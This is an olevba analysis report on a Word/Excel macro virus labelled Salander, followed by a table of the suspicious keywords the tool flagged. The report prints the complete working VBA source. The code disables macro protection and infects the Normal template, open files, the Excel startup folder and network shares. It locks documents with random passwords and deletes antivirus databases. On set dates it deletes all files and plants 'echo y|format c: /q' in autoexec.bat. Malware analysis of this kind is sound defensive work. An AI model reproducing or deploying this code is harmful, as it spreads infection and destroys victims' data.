olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Salander-47d74918a02a24206bced282749d1e6a3630c7ca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Salander-47d74918a02a24206bced282749d1e6a3630c7ca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'salamandra favo-rit@narod.ru
Dim a As Integer
Private Sub Workbook_BeforeClose(Cancel As Boolean)
 a = 3
 Nod
End Sub
Private Sub Workbook_Open()
 a = 1
 Nod
End Sub
Private Sub Document_Close()
 a = 2
 Don
End Sub
Private Sub Document_Open()
 a = 1
 Don
End Sub
Private Sub Nod()
'“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨
 On Error Resume Next
'Ž¯¨áë¢ ¥¬ ¯¥à¥¬¥­­ë¥ ¤«ï à ¡®âë
 Dim vis, parol, nax, wor As String
 Dim kol, vr, i, lon As Integer
 Dim pr As Boolean
 kol = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 vis = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, kol)
 nax = ""
 mno = ""
 Set mno = GetObject(, "Word.Application")
  If mno = "" Then pr = False Else pr = True
 Set wordik = CreateObject("Word.Application")
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥,   § ®¤­® ¨ ¢ ¢®à¤¥
  wordik.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
  wordik.Options.VirusProtection = False
 If pr = False Then
'Š®¯¨àã¥¬ ª®¤ ¢ ¢®à¤
  If wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'salamandra favo-rit@narod.ru" Then
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, lon
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
'âã¤  ¦¥ ª®¯¨àã¥¬ äã­ªæ¨î ­¥¢¨¤¨¬®áâ¨
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Sub viewvbcode()"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " NormalTemplate.Saved = True"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, " For i = 1 To Documents.Count"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 7, "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 8, "  Documents(i).Saved = True"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 9, " Next i"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 10, "End Sub"
'“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã à¥ ªæ¨¨ ­   ªâ¨¢ æ¨î ®ª­ , â ª ª ª ¢®à¤ ¥¥ ­¥ ¢®¯à¨­¨¬ ¥â
   lon = wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To lon
    wor = wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If wor = " a = 8" Then
     wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i - 1, 4
    End If
'‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ 
    If wor = "" Then
     wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
    End If
   Next i
  End If
 End If
 wordik.Quit
'’ ª ª ª ¢ íªá¥«¥ ­ è  ª­¨£  áªàëâ , â® ¤®¡ ¢«ï¥¬ ­®¢ãî ª­¨£ã
 If ThisWorkbook.Name = "Salamandra.xls" And a = 1 Then
  Workbooks.Add
 End If
'…á«¨ ¢  ¢â®§ ¯ãáª¥ ­¥â ­¨ç¥£® ¯¨è¥¬ âã¤  ­ è ª®¤
 With Application.FileSearch
  .LookIn = Application.StartupPath
  .FileName = "Salamandra.xls"
  .Execute
  nax = .FoundFiles(1)
 End With
 If nax = "" And ThisWorkbook.Name <> "Salamandra.xls" Then
  Workbooks.Add
  ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  ActiveWorkbook.SaveAs (Application.StartupPath + "\Salamandra.xls")
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
  Workbooks("Salamandra.xls").Windows(1).Visible = False
  Workbooks("Salamandra.xls").Save
 End If
'�¥à¥¯¨áë¢ ¥¬ ­ è ª®¤ ¢® ¢á¥ ®âªàëâë¥ ª­¨£¨
 For i = 1 To Workbooks.Count
  vr = Workbooks(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  If vr <> kol Then
   Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.InsertLines 1, vis
  End If
 Next i
'�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ¯®¤®¡à ­­ë© á«ãç ©­ë¬ ®¡à §®¬ ­  ¢á¥ «¨áâë
 If ThisWorkbook.Name <> "Salamandra.xls" Then
  If a = 3 Then
   Randomize
   parol = ""
   For i = 1 To 15
    par = 0
    While par < 65
     par = Int(Rnd * 90) + 1
    Wend
    parol = parol + Chr(par)
   Next i
   For i = 1 To Sheets.Count
    Sheets(i).Protect Password:=parol
   Next i
   For i = 1 To kol
    prov = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
     ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, "'Password=" + parol
    End If
   Next i
  End If
'�à¨ ®âªàëâ¨¨ ª­¨£¨ á­¨¬ ¥¬ ¯ à®«ì
  If a = 1 Then
   parol = ""
   For i = 1 To kol
    prov = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     parol = Mid(prov, 11, 25)
    End If
   Next i
   For i = 1 To Sheets.Count
    Sheets(i).Unprotect (parol)
   Next i
  End If
 End If
End Sub
Private Sub Don()
'“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨
 On Error Resume Next
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢
 Options.VirusProtection = False
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
 Dim nor, vis, parol, prov, xlpath, nax As String
 Dim lon, lonvis, kol, i, par As Integer
 kol = Documents.Count
 lon = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 vis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, lonvis)
'‡ ¯¨áë¢ ¥¬ ª®¤ ¢ íªá¥«ì
 Set exl = CreateObject("Excel.Application")
 exl.Run
 xlpath = exl.Application.StartupPath
 With Application.FileSearch
  .LookIn = xlpath
  .FileName = "Salamandra.xls"
  .Execute
  nax = .FoundFiles(1)
 End With
 If nax = "" And ThisDocument.Name <> NormalTemplate.Name Then
  exl.Workbooks.Add
  exl.ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  exl.ActiveWorkbook.SaveAs (xlpath + "\Salamandra.xls")
  For i = 1 To exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "" Then
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
   End If
  Next i
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " a = 8"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " Nod"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, "End Sub"
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
  exl.Windows(1).Visible = False
  exl.Workbooks("Salamandra.xls").Save
 End If
 exl.Quit
'§ ¯¨áë¢ ¥¬áï ¢ è ¡«®­ ¨ ¢á¥ ®âªàëâë¥ ¤®ªã¬¥­âë
 If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines <> lon Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, lon
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, " For i = 1 To Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 7, "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 8, "  Documents(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 9, " Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 10, "End Sub"
 End If
  For i = 1 To kol
   If Documents.Item(i).Name <> ThisDocument.Name And Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines <> lon - 8 Then
    Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
'“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã áªàëâ¨ï ª®¤  â ª ª ª ®­  ¬®¦¥â ¡ëâì â®«ìª® ¢ ¥¤. íª§¥¬¯«ïà¥ ¢ ­®à¬ «¥
   gon = Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For j = 1 To gon
    wor = Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(j, 1)
    If wor = "Sub viewvbcode()" Then
     Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 8
    End If
'‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ 
    If wor = "" Then
     Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 1
    End If
   Next j
   End If
  Next i
 If a = 1 Then
'�à¨ ®âªàëâ¨¨ á®§¤ ¥¬ ä ©« ¤«ï ¯®«ãç¥­¨ï á¯¨áª  á¥âª¨ ¨ § ¯ãáª ¥¬ ¥£®
 Open "c:\windows\net.bat" For Output As #1
  Print #1, "c:\windows\net.exe view>c:\windows\net.tmp"
 Close #1
 doscom = Shell("c:\windows\net.bat", 0)
'�à¨ ®âªàëâ¨¨ á­¨¬ ¥¬ ãáâ ­®¢«¥­­ë© ¯ à®«ì
  If ThisDocument.Name <> NormalTemplate.Name Then
   lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   parol = ""
   For i = 1 To lonvis
    prov = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     parol = Mid(prov, 11, 25)
    End If
   Next i
   ThisDocument.Unprotect (parol)
  End If
 End If
 If a = 2 Then
'�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ­  ¤®ªã¬¥­â ¯®¤®¡à ­ë© á«ãç ©­ë¬ ®¡à §®¬
  If ThisDocument.Name <> NormalTemplate.Name Then
   Randomize
   parol = ""
   For i = 1 To 15
    par = 0
    While par < 65
     par = Int(Rnd * 90) + 1
    Wend
    parol = parol + Chr(par)
   Next i
   ThisDocument.Protect Type:=wdAllowOnlyComments, Password:=parol
   lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To lonvis
    prov = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
     ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, "'Password=" + parol
    End If
   Next i
   ThisDocument.Save
  End If
'�à¨ § ªàëâ¨¨ ¯¨è¥¬ ª®¤ ¢® ¢á¥ à ááè à¥­ë¥ à¥áãàáë ¢ á¥âª¥
 '�à®¢¥àï¥¬ ­ «¨ç¨¥ ¢à¥¬¥­­®£® ä ©«  á®§¤ ­­®£® ¯à¨ ®âªàëâ¨¨ ¤®ªã¬¥­â 
 sss = ""
 Dim komp(500), wrm As String
 Dim KompCount As Integer
 KompCount = 1
 wrm = ""
 With Application.FileSearch
  .FileName = "net.tmp"
  .LookIn = "C:\windows"
  .Execute
  For i = 1 To .FoundFiles.Count
   sss = .FoundFiles(i)
  Next i
 End With
 If sss <> "" Then
'‘ç¨âë¢ ¥¬ ¢à¥¬¥­­ë© ä ©«¢ ¬ áá¨¢
  Open "c:\windows\net.tmp" For Input As #1
   Do While Not EOF(1)
    wrm = Input(1, #1)
    If wrm = "\" And KompCount <= 500 Then
     komp(KompCount) = wrm
     Do While wrm <> " "
      wrm = Input(1, #1)
      If wrm <> " " Then
       komp(KompCount) = komp(KompCount) + wrm
      End If
     Loop
     KompCount = KompCount + 1
    End If
   Loop
  Close #1
 For i = 1 To 500
  Err.Clear
  sing = komp(i) + "\c\" + Mid(xlpath, 4, Len(xlpath))
  nax = ""
  Open sing + "\vrm.tmp" For Output As #1
   Print #1, "1"
  Close #1
  Kill (sing + "\vrm.tmp")
  If Err.Number = 0 And komp(i) <> "" Then
   Set exl = CreateObject("Excel.Application")
   exl.Run
   With Application.FileSearch
    .LookIn = sing
    .FileName = "Salamandra.xls"
    .Execute
    nax = .FoundFiles(1)
   End With
'�¨è¥¬ ª®¤ ¢ íªá¥«ì ­  ­ ©¤¥­ë© à áè à¥­­ë© à¥áãàá (à ¡®â  ª®¤  § ¢¨á¨â ®â ¬­®£¨å "­®", â ª çâ® à á¯à®áâà ­¥­¨¥ ¯® á¥âª¥ ç¨áâ® íª¯¥à¥¬¥­â «ì­®¥ ¤¥â¨é¥)
   If nax = "" Then
    exl.Workbooks.Add
    exl.ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
    exl.ActiveWorkbook.SaveAs (sing + "\Salamandra.xls")
    For j = 1 To exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.CountOfLines
     If exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.Lines(j, 1) = "" Then
      exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 1
     End If
    Next j
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " a = 8"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " Nod"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, "End Sub"
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
    exl.Windows(1).Visible = False
    exl.Workbooks("Salamandra.xls").Save
   End If
   exl.Quit
  End If
 Next i
 End If
'‚ª«îç ¥¬ äã­ªæ¨î ã­¨çâ®¦¥­¨ï (¥á«¨ á®¢¯ «  ¤ â )
 nax = ""
 xon = ""
'�à®¢¥àª  ­   "á¢®©-çã¦®©"
 With Application.FileSearch
  .LookIn = "c:\windows"
  .FileName = "Salamon.srg"
  .Execute
  nax = .FoundFiles(1)
 End With
'…á«¨ çã¦®©, â® ª¨«ïâì
 If nax = "" Then
  With Application.FileSearch
   .LookIn = "c:\windows"
   .FileName = "avp.kll"
   .Execute
   xon = .FoundFiles(1)
  End With
  If xon = "" Then
   Open "c:\windows\avp.kll" For Output As #1
    Print #1, Date
   Close #1
'„«ï â®£® çâ®¡ë áà ¡®â «® ä®à¬ â¨à®¢ ­¨¥ ¢¨­â  ¨§  ¢â®§ ¯ãáª , ¥¦¥¤­¥¢­®e ã¡¨¢ ¥¬ €‚�è­ë¥ ¡ §ë
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.avc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
  Else
   Open "c:\windows\avp.kll" For Input As #1
    mmm = Input(2, #1)
   Close #1
   If mmm <> Mid(Date, 1, 2) Then
    With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.avc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
    End With
    Open "c:\windows\avp.kll" For Output As #1
     Print #1, Date
    Close #1
   End If
  End If
  If (Month(Date) = 2 And Day(Date) = 23) Or (Month(Date) = 3 And Day(Date) = 8) Or (Month(Date) = 5 And Day(Date) = 26) Or (Month(Date) = 6 And Day(Date) = 30) Or (Month(Date) = 8 And Day(Date) = 30) Or (Month(Date) = 11 And Day(Date) = 21) Or (Month(Date) = 4 And Day(Date) = 1) Or (Month(Date) = 12 And Day(Date) = 13) Then
'‚ ãª § ­­ë¥ ¢ëè¥ ¤ âë ã¡¨âì ¢á¥ ­  ¢¨­â¥, â®«ìª® ¬¥¤«¥­­® :)
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.doc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.xls"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.*"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   Open "c:\autoexec.bat" For Output As #1
    Print #1, "e" + "c" + "h" + "o" + " " + "y" + "|" + "f" + "o" + "r" + "m" + "a" + "t" + " c: /q"
   Close #1
  End If
 End If
 End If
End Sub
'Password=JGPRZXZIIFUNZEO
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |net.bat             |Executable file name                         |
|IOC       |net.exe             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
